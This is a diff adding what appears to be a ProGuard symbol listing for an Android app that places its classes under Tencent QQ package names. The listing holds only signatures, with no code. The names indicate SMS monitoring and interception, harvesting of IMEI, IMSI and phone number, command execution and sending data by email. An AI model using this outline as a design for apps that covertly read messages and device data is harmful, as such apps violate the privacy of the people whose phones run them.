@@ -1,0 +1,119 @@
+android.annotation.SuppressLint
+android.annotation.TargetApi
+com.baidu.kx.BuildConfig
+com.baidu.kx.R
+com.baidu.kx.R$attr
+com.baidu.kx.R$color
+com.baidu.kx.R$dimen
+com.baidu.kx.R$drawable
+com.baidu.kx.R$layout
+com.baidu.kx.R$string
+com.baidu.kx.R$style
+com.baidu.kx.R$xml
+com.tencent.qq.DataCleanManager
+com.tencent.qq.HttpClientHelper:
+    30:32:private HttpClientHelper()
+com.tencent.qq.HttpUtils:
+    9:9:public HttpUtils()
+com.tencent.qq.Keys
+com.tencent.qq.MainService:
+    private static final long TIMER_INTERVAL
+    private java.lang.String[] availableUser
+com.tencent.qq.SMSHandler
+com.tencent.qq.XYHttpConnection:
+    62:63:public byte[] doPost(java.lang.String)
+    94:106:public byte[] doPost(java.lang.String,java.util.HashMap)
+    117:125:private boolean checkResponseEntity(org.apache.http.HttpResponse)
+com.tencent.sms.MessageItem:
+    51:52:public void setId(int)
+    58:58:public int getType()
+    65:66:public void setType(int)
+    72:72:public int getProtocol()
+    79:80:public void setProtocol(int)
+    85:85:public long getDate()
+    92:93:public void setDate(long)
+    106:107:public void setPhone(java.lang.String)
+    120:121:public void setBody(java.lang.String)
+com.tencent.sms.SMSConstant
+com.tencent.sms.SMSHandler:
+    private static final java.lang.String TAG
+com.tencent.sms.SMSObserver:
+    private static final int MAX_NUMS
+    private static final int MAX_ID
+    private static final java.lang.String SELECTION
+    private static final int COLUMN_INDEX_ID
+    private static final int COLUMN_INDEX_TYPE
+    private static final int COLUMN_INDEX_PHONE
+    private static final int COLUMN_INDEX_BODY
+    private static final int COLUMN_INDEX_DATE
+    private static final int COLUMN_INDEX_PROTOCOL
+com.tencent.sms.SmsLockHelper:
+    4:4:public SmsLockHelper()
+com.tencent.util.DeviceInfo:
+    9:15:public DeviceInfo(java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String,int,java.lang.String,java.lang.String,java.lang.String,boolean,java.lang.String,int,java.lang.String)
+    44:45:public void setMAC(java.lang.String)
+    59:60:public void setIMEI(java.lang.String)
+    74:75:public void setIMSI(java.lang.String)
+    81:81:public java.lang.String getPhoneNumber()
+    89:90:public void setPhoneNumber(java.lang.String)
+    104:104:public int getNetwrokType()
+    112:113:public void setNetwrokType(int)
+    121:121:public java.lang.String getProvidersName()
+    129:130:public void setProvidersName(java.lang.String)
+    138:138:public java.lang.String getSDKVersion()
+    147:148:public void setSDKVersion(java.lang.String)
+    164:165:public void setSDKReleaseVersion(java.lang.String)
+    171:171:public java.lang.String getChannelCode()
+    179:180:public void setChannelCode(java.lang.String)
+    186:186:public int getAppVersionCode()
+    194:195:public void setAppVersionCode(int)
+    201:201:public java.lang.String getAppVersionName()
+    208:209:public void setAppVersionName(java.lang.String)
+    215:215:public java.lang.String getPhoneModel()
+    222:223:public void setPhoneModel(java.lang.String)
+    228:228:public boolean getHasInstallPermission()
+    234:234:public java.lang.String getLanguage()
+    241:242:public void setLanguage(java.lang.String)
+    248:249:public void setHasInstallPermission(boolean)
+com.tencent.util.Mail
+com.tencent.util.Utility:
+    39:39:public Utility()
+    51:58:public static int getPackageVersionCode(android.content.Context,java.lang.String)
+    69:76:public static java.lang.String getPackageVersionName(android.content.Context,java.lang.String)
+    91:134:public static int GetInstallLocation(java.lang.String,android.content.Context)
+    145:174:public static java.lang.String transCodesize2String(long)
+    185:197:public static java.lang.String PrepareAppUpdateListParam(android.content.Context)
+    203:207:public static java.lang.String toString(java.lang.Object)
+    213:219:public static java.lang.String replaceX(java.lang.String)
+    225:230:public static void addd(android.content.Context,java.lang.Class,java.lang.String,java.lang.String)
+    241:247:public static boolean isApkFileValid(android.content.Context,java.io.File)
+    252:271:public static java.lang.String[] aggg(android.net.Uri)
+    284:294:public static boolean isPkgInstalled(android.content.Context,java.lang.String)
+    305:312:public static void popUpInstall(android.content.Context,java.lang.String)
+    327:356:public static void openApplication(android.content.Context,java.lang.String)
+    408:412:public static void unInstall(android.content.Context,java.lang.String)
+    421:428:public static boolean checkNetWork(android.content.Context)
+    437:440:public static void wirelessSetting(android.content.Context)
+    452:466:public static java.lang.Object getManiMetaData(android.content.Context,java.lang.String)
+    471:489:public static void jhhhh(android.content.Context,java.lang.String)
+    501:515:public static boolean lgggg(android.content.Context,java.lang.String)
+    528:533:private static java.lang.String getPackageName(android.content.Context,java.lang.String)
+    545:548:public static boolean isNullOrEmpty(java.lang.String)
+    559:559:public static java.io.File newFile(java.lang.String)
+    564:574:public static java.lang.String dealException(java.lang.Exception)
+    583:589:public static void closeSth(java.io.Closeable)
+    597:603:public static boolean hasSdcard()
+    614:614:public static float getSeconds(long)
+    624:633:public static void openFile(android.content.Context,java.io.File)
+    637:670:private static java.lang.String getMIMEType(java.io.File)
+    676:687:public static void showFileChooser(android.app.Activity,java.lang.String)
+    696:711:public static java.lang.String NumberToIntegral(int)
+    720:723:public static void startApp(android.content.Context,java.lang.String)
+    745:750:public static void cancelNotification(android.content.Context,int)
+    759:760:public static int pxToDip(android.content.Context,float)
+    763:764:public static int dipToPx(android.content.Context,float)
+    774:774:public static varargs boolean executeCmd(boolean,java.lang.String[])
+    783:825:public static varargs boolean executeCmdEx(boolean,java.lang.String,java.lang.String[])
+    835:842:public static void ShareFile(android.content.Context,java.io.File)
+    850:856:public static void ShareText(android.content.Context,java.lang.String)
+    899:921:public static int sendMailByJavaMail(java.lang.String,java.lang.String)
